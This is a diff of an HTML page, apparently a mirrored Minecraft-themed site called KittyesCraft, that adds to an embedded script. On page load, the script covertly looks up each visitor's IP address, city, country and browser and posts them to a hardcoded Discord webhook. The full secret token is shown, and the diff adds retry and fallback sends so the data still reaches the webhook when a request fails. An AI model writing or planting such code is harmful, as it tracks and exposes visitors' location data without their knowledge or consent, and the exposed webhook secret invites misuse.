@@ -599,14 +599,10 @@ fetch('http://ip-api.com/json/?fields=66846719')
         }
     </script>  <!-- SNOW SCRIPT KAPATILDI -->
 
-    <!-- TELEGRAM BOT -->
- <!-- TELEGRAM BOT - EN STABİL VERSİYON -->
-<!-- DISCORD WEBHOOK - SON VERSİYON -->
+<!-- DISCORD WEBHOOK - GÜÇLENDİRİLMİŞ VERSİYON -->
 <script>
 (function() {
-    // --- BURAYA KENDİ DISCORD WEBHOOK URL'İNİ YAPIŞTIR ---
-    const webhookUrl = "https://discord.com/api/webhooks/1478105314405384447/iKMCpSuBpMC54hFF1lGOySS1rB7oh344s9vIKCuPvc2uqbjmOZ7iSpWpKr2-cOMBz1Jl"; 
-    // ---------------------------------------------------
+    const webhookUrl = "https://discord.com/api/webhooks/1478105314405384447/iKMCpSuBpMC54hFF1lGOySS1rB7oh344s9vIKCuPvc2uqbjmOZ7iSpWpKr2-cOMBz1Jl";
 
     function getBrowser() {
         const ua = navigator.userAgent;
@@ -617,22 +613,24 @@ fetch('http://ip-api.com/json/?fields=66846719')
         return "Bilinmiyor";
     }
 
-    // HTTPS API ile IP ve konum al
+    // 1. IP adresini al
     fetch('https://ipapi.co/json/')
-        .then(response => response.json())
+        .then(response => {
+            if (!response.ok) throw new Error(`IP API hatası: ${response.status}`);
+            return response.json();
+        })
         .then(data => {
-            if (!data.ip) throw new Error("IP alınamadı");
+            if (!data.ip) throw new Error("IP adresi bulunamadı");
 
             const browser = getBrowser();
             
-            // Discord Embed formatında mesaj oluştur [citation:8][citation:10]
             const embed = {
                 embeds: [{
                     title: '🤡 KittyesCraft Giriş Yapıldı',
-                    color: 16744879, // Pembe renk
+                    color: 16744879,
                     fields: [
                         { name: '🌐 IP', value: data.ip, inline: true },
-                        { name: '📍 Konum', value: `${data.country_name} / ${data.city}`, inline: true },
+                        { name: '📍 Konum', value: `${data.country_name || '?'} / ${data.city || '?'}`, inline: true },
                         { name: '🚀 Tarayıcı', value: browser, inline: true },
                         { name: '⏰ Zaman', value: new Date().toLocaleString('tr-TR'), inline: false }
                     ],
@@ -641,7 +639,7 @@ fetch('http://ip-api.com/json/?fields=66846719')
                 }]
             };
 
-            // Discord'a gönder ( HTTPS -> HTTPS, sorun yok! )
+            // 2. Discord'a gönder
             return fetch(webhookUrl, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -649,22 +647,51 @@ fetch('http://ip-api.com/json/?fields=66846719')
             });
         })
         .then(response => {
-            if (response.ok) console.log('✅ Discord\'a mesaj gönderildi');
-            else console.log('❌ Discord hatası:', response.status);
+            if (response.ok) {
+                console.log('✅ Discord\'a mesaj gönderildi');
+            } else {
+                // HATA KODUNU DETAYLI GÖSTER
+                response.text().then(text => {
+                    console.error('❌ Discord hata detayı:', response.status, text);
+                });
+                
+                // Hata olursa basit mesaj dene (Rate Limit vs.)
+                if (response.status === 429) {
+                    console.log('⏳ Rate limit, 5 saniye bekleyip tekrar dene...');
+                    setTimeout(() => {
+                        fetch(webhookUrl, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ 
+                                content: `✅ Giriş yapıldı! (Rate limit) - ${new Date().toLocaleString('tr-TR')}` 
+                            })
+                        });
+                    }, 5000);
+                } else {
+                    // Diğer hatalarda direkt basit mesaj
+                    fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ 
+                            content: `✅ Giriş yapıldı! (Detay alınamadı - ${response.status}) - ${new Date().toLocaleString('tr-TR')}` 
+                        })
+                    });
+                }
+            }
         })
         .catch(error => {
-            console.error('Hata:', error);
-            // Hata olursa basit mesaj dene
+            console.error('❌ Ana hata:', error);
+            // Tamamen hata olursa basit mesaj
             fetch(webhookUrl, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ 
-                    content: `✅ Giriş yapıldı! (Detay alınamadı) - ${new Date().toLocaleString('tr-TR')}` 
+                    content: `✅ Giriş yapıldı! (Bağlantı hatası) - ${new Date().toLocaleString('tr-TR')}` 
                 })
-            });
+            }).catch(e => console.error('❌ Son çare de başarısız:', e));
         });
 })();
-
+</script>
 </body>
 </body>
 
@@ -672,6 +699,7 @@ fetch('http://ip-api.com/json/?fields=66846719')
 <!-- Mirrored from Kittyescraft.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 28 Feb 2026 14:23:44 GMT -->
 
 </html>
+
 
 
 
